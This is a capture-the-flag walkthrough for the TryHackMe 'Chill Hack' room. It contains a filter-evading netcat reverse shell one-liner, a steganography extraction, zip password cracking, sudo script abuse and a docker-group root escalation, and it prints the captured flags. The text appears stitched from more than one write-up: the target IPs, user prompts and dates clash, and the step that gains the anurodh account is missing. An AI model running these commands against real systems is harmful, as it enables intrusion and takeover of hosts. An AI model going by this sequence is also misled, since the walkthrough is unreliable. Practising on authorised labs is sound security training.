#   Tryhackme - Chill Hack

##  IP address = 10.10.65.221

##  Walkthrough by
```
Shaswata Saha
21-07-2023
11:32PM
```

##  Steps :
1.  nmap scan:
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-21 14:06 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:06
Completed NSE at 14:06, 0.00s elapsed
Initiating NSE at 14:06
Completed NSE at 14:06, 0.00s elapsed
Initiating NSE at 14:06
Completed NSE at 14:06, 0.00s elapsed
Initiating Ping Scan at 14:06
Scanning 10.10.65.221 [2 ports]
Completed Ping Scan at 14:06, 0.71s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:06
Completed Parallel DNS resolution of 1 host. at 14:06, 0.30s elapsed
Initiating Connect Scan at 14:06
Scanning 10.10.65.221 [1000 ports]
Discovered open port 22/tcp on 10.10.65.221
Discovered open port 80/tcp on 10.10.65.221
Discovered open port 21/tcp on 10.10.65.221
Increasing send delay for 10.10.65.221 from 0 to 5 due to 68 out of 226 dropped probes since last increase.
Increasing send delay for 10.10.65.221 from 5 to 10 due to max_successful_tryno increase to 4
Completed Connect Scan at 14:07, 34.27s elapsed (1000 total ports)
Initiating Service scan at 14:07
Scanning 3 services on 10.10.65.221
Completed Service scan at 14:07, 6.53s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.65.221.
Initiating NSE at 14:07
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 14:07, 8.01s elapsed
Initiating NSE at 14:07
Completed NSE at 14:07, 2.08s elapsed
Initiating NSE at 14:07
Completed NSE at 14:07, 0.00s elapsed
Nmap scan report for 10.10.65.221
Host is up (0.22s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.28.202
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Game Info
|_http-favicon: Unknown favicon MD5: 7EEEA719D1DF55D478C68D9886707F17
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 14:07
Completed NSE at 14:07, 0.00s elapsed
Initiating NSE at 14:07
Completed NSE at 14:07, 0.00s elapsed
Initiating NSE at 14:07
Completed NSE at 14:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.09 seconds

```

2.  Gobuster scan:
```bash
┌──(subhro1530㉿subhro)-[~]
└─$ gobuster dir -u http://10.10.103.81 -w Documents/gobuster-wordlist/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.103.81
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                Documents/gobuster-wordlist/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/22 03:10:04 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.103.81/images/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.103.81/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.103.81/js/]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.103.81/fonts/]
/secret               (Status: 301) [Size: 313] [--> http://10.10.103.81/secret/]
.
.
```

We see a /secret folder .

3.  Getting a reverse shell by preventing the filtering:
```bash
r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.28.202 4242 >/tmp/f
```

4.  Taking the netcat listener and then searching for vulnerabilities:
```bash
┌──(subhro1530㉿subhro)-[~]
└─$ nc -nvlp 4242
listening on [any] 4242 ...
connect to [10.17.28.202] from (UNKNOWN) [10.10.103.81] 35156
/bin/sh: 0: can't access tty; job control turned off
```

5.  Stabilize shell:
```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html/secret$ ls
ls
images  index.php
www-data@ubuntu:/var/www/html/secret$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
www-data@ubuntu:/var/www/html/secret$ 

```

6.  Download the image (images/hacker-with-laptop_23-2147985341.jpg). There is a secret in it.

```bash
kali@kali:/data/Chill_Hack/files$ file hacker-with-laptop_23-2147985341.jpg 
hacker-with-laptop_23-2147985341.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, baseline, precision 8, 626x417, components 3
kali@kali:/data/Chill_Hack/files$ steghide extract -sf hacker-with-laptop_23-2147985341.jpg 
Enter passphrase: 
wrote extracted data to "backup.zip".
```

7.  The resulting backup.zip file is a password compressed archive. Let’s crack the password.
```bash
kali@kali:/data/Chill_Hack/files$ /data/src/john/run/zip2john backup.zip > backup.hash
ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: 2b chk, TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3 type=8
kali@kali:/data/Chill_Hack/files$ /data/src/john/run/john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pass1word        (backup.zip/source_code.php)
1g 0:00:00:00 DONE (2021-04-26 20:43) 9.090g/s 111709p/s 111709c/s 111709C/s total90..hawkeye
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

8.  Getting the user flag:
```bash  
anurodh@ubuntu:~$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: oops
Hello user! I am oops,  Please enter your message: /bin/bash
id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
python3 -c "import pty;pty.spawn('/bin/bash')"
bash: /home/anurodh/.bashrc: Permission denied
apaar@ubuntu:~$ cd /home/apaar
apaar@ubuntu:/home/apaar$ ls -la
total 44
drwxr-xr-x 5 apaar apaar 4096 Oct  4  2020 .
drwxr-xr-x 5 root  root  4096 Oct  3  2020 ..
-rw------- 1 apaar apaar    0 Oct  4  2020 .bash_history
-rw-r--r-- 1 apaar apaar  220 Oct  3  2020 .bash_logout
-rw-r--r-- 1 apaar apaar 3771 Oct  3  2020 .bashrc
drwx------ 2 apaar apaar 4096 Oct  3  2020 .cache
drwx------ 3 apaar apaar 4096 Oct  3  2020 .gnupg
-rwxrwxr-x 1 apaar apaar  286 Oct  4  2020 .helpline.sh
-rw-rw---- 1 apaar apaar   46 Oct  4  2020 local.txt
-rw-r--r-- 1 apaar apaar  807 Oct  3  2020 .profile
drwxr-xr-x 2 apaar apaar 4096 Oct  3  2020 .ssh
-rw------- 1 apaar apaar  817 Oct  3  2020 .viminfo
apaar@ubuntu:/home/apaar$ cat local.txt
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}

At this stage, it may be a good idea to add your SSH public key (~/.ssh/id_rsa.pub) to /home/apaar/.ssh/authorized_keys to connect directly using SSH and benefit from a more stable shell.

User flag: {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww} 
```

9.  Logging back to anurodh, we can see that the user is member of the docker group:
```bash
anurodh@ubuntu:/home/apaar$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```


10. let’s confirm:
```bash
anurodh@ubuntu:/home/apaar$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
alpine              latest              a24bb4013296        11 months ago       5.57MB
hello-world         latest              bf756fb1ae65        16 months ago       13.3kB

Checking on GTFOBins, we confirm there is a possible privilege escalation; let’s test:

anurodh@ubuntu:/home/apaar$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# cd /root
# ls -la
total 68
drwx------  6 root root  4096 Oct  4  2020 .
drwxr-xr-x 24 root root  4096 Oct  3  2020 ..
-rw-------  1 root root     0 Oct  4  2020 .bash_history
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  2 root root  4096 Oct  3  2020 .cache
drwx------  3 root root  4096 Oct  3  2020 .gnupg
-rw-------  1 root root   370 Oct  4  2020 .mysql_history
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-r--r--  1 root root 12288 Oct  4  2020 .proof.txt.swp
drwx------  2 root root  4096 Oct  3  2020 .ssh
drwxr-xr-x  2 root root  4096 Oct  3  2020 .vim
-rw-------  1 root root 11683 Oct  4  2020 .viminfo
-rw-r--r--  1 root root   166 Oct  3  2020 .wget-hsts
-rw-r--r--  1 root root  1385 Oct  4  2020 proof.txt
# cat proof.txt 


          {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}


Congratulations! You have successfully completed the challenge.
```